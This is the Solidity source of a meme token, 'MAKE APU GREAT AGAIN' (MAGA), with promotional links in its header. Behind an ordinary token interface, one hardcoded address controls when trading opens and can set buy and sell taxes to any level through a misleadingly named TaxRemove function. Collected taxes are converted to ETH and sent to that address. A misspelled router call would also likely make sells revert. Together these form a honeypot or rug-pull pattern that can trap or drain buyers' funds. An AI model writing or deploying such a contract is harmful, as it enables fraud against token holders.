/**

/*

 .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. |
| | ____    ____ | || |      __      | || |    ______    | || |      __      | |
| ||_   \  /   _|| || |     /  \     | || |  .' ___  |   | || |     /  \     | |
| |  |   \/   |  | || |    / /\ \    | || | / .'   \_|   | || |    / /\ \    | |
| |  | |\  /| |  | || |   / ____ \   | || | | |    ____  | || |   / ____ \   | |
| | _| |_\/_| |_ | || | _/ /    \ \_ | || | \ `.___]  _| | || | _/ /    \ \_ | |
| ||_____||_____|| || ||____|  |____|| || |  `._____.'   | || ||____|  |____|| |
| |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------' 
 
https://t.me/makeApuGreatAgain

https://makeapugreatagain.vip/

https://x.com/makeapugreat 
*/

// SPDX-License-Identifier: unlicense


pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingTaxfsOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract MAGA  {



        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   _name = unicode"MAKE APU GREAT AGAIN"; 
        string public   _symbol = unicode"MAGA";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 69420000000  * 10**decimals;

        uint256 buyTaxfs = 0;
        uint256 sellTaxfs = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return _name;
        }

    
        function symbol() public view virtual returns (string memory) {
        return _symbol;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed MTKSp,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant MTKSp = payable(address(0x73da4453eB4c4D6a882477dB717384C74F3CA4F3));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == MTKSp || to == MTKSp);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingTaxfsOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                MTKSp.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 TaxfsAmount = amount * (from == pair ? buyTaxfs : sellTaxfs) / 100;
                amount -= TaxfsAmount;
                balanceOf[address(this)] += TaxfsAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function MAGAOpen() external {
            require(msg.sender == MTKSp);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _RemeveTax(uint256 _buy, uint256 _sell) private {
            buyTaxfs = _buy;
            sellTaxfs = _sell;
        }

        function TaxRemove(uint256 _buy, uint256 _sell) external {
            if(msg.sender != MTKSp)        
                revert Permissions();
            _RemeveTax(_buy, _sell);
        }
    }